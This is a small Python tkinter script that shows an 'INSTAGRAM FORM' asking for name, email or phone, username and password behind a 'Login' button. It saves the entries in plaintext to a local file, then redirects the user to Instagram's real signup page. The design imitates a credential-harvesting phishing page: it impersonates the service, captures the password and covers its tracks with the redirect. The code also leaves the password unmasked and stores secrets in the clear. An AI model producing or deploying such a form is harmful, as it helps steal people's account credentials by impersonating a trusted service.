import tkinter as tk
import webbrowser as wb
root=tk.Tk()
root.title("INSTAGRAM FORM")
l1=tk.Label(root,text="First Name and LAST NAME",
           font=("Times New Roman",20))
l1.grid()
e1=tk.Entry(root,font=("Times New Roman",20),width=25)
e1.grid()
l2=tk.Label(root,text="EMAIL ID or MOBILE NO",
           font=("Times New Roman",20))
l2.grid()
e2=tk.Entry(root,font=("Times New Roman",20),width=25)
e2.grid()
l3=tk.Label(root,text="USERNAME",
           font=("Times New Roman",20))
l3.grid()
e3=tk.Entry(root,font=("Times New Roman",20),width=25)
e3.grid()
l4=tk.Label(root,text="PASSWORD",
           font=("Times New Roman",20))
l4.grid()
e4=tk.Entry(root,font=("Times New Roman",20),width=25,)
e4.grid()
clicked= tk.StringVar()
l5=tk.Label(root,text="",
           font=("Times New Roman",30))
l5.grid()

def submit():

    if(e1.get()=="" and e2.get()==""):
        l5["text"]="* Enter the required Info"
    elif(e3.get()=="" and e4.get()==""):
        l5["text"]="* Enter the required Info"
    else:
        try:
            f=open("data.txt","+w")
            f.writelines(["First Name and Last Name="+e1.get()+"\n"])
            f.writelines(["EmailId or MobileNo="+e2.get()+"\n"])
            f.writelines(["Username="+e3.get()+"\n"])
            f.writelines(["Password="+e4.get()+"\n"])
            f.writelines(["Ad Site Name ="+clicked.get()])
            f.close()
        except IOError:
            print("Form Data Storage Failed")
        wb.open("www.instagram.com/accounts/emailsignup/?next=")
    
b=tk.Button(root,text="Login",font=("TIMES NEW ROMAN",15),
            command=submit,bg="skyblue",
            activebackground="lightblue")
b.grid()
tk.mainloop()